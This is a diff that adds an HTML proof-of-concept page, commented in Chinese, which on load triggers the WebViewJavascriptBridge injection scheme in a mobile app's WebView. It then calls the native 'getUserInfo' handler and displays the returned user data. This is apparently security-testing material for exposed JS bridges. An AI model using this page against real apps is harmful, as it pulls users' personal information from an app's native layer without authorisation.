@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>JSBridge PoC</title></head>
+<body onload="my_script()">
+  <div id="out"></div>
+  <pre id="raw" style="white-space:pre-wrap;word-break:break-all;font:13px monospace"></pre>
+
+<script>
+var OUT = document.getElementById('out');
+var RAW = document.getElementById('raw');
+
+function esc(s){ return String(s).replace(/[&<>"]/g, function(c){
+  return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+
+function show(label, data){
+  var text;
+  try { text = JSON.stringify(data, null, 2); } catch(e) { text = String(data); }
+  console.log(label, data);
+  OUT.innerHTML += '<h3>' + esc(label) + '</h3>';
+  // 用 textContent 写入，避免返回内容里的标签破坏页面结构
+  var pre = document.createElement('pre');
+  pre.style.cssText = 'white-space:pre-wrap;word-break:break-all;background:#f6f6f6;padding:8px';
+  pre.textContent = text;
+  OUT.appendChild(pre);
+  RAW.textContent += label + '\n' + text + '\n\n';
+}
+
+function output(res){
+  show('getUserInfo 返回', res);
+}
+
+function my_script(){
+  // 注入 WebViewJavascriptBridge
+  location.href = "wvjbscheme://__bridge_loaded__";
+
+  var handler = "getUserInfo";
+  var tried = 0;
+
+  var timer = setInterval(function(){
+    tried++;
+    if (typeof WebViewJavascriptBridge === 'undefined') {
+      show('状态', '第 ' + tried + ' 次等待 bridge...（未注入或 scheme 不正确）');
+      if (tried >= 10) { clearInterval(timer); show('结论', 'bridge 未就绪，PoC 未触发'); }
+      return;
+    }
+    clearInterval(timer);
+    show('状态', 'bridge 已注入，调用 ' + handler);
+
+    try {
+      WebViewJavascriptBridge.callHandler(handler, {}, function(res){
+        output(res);
+      });
+      // 兜底：若原生未回调 responseCallback，8 秒后提示
+      setTimeout(function(){
+        if (!RAW.textContent) show('结论', '调用已发出但无响应：原生可能未注册该 handler，或未回调 responseCallback');
+      }, 8000);
+    } catch(e) {
+      show('异常', e.toString());
+    }
+  }, 500);
+}
+</script>
+</body>
+</html>
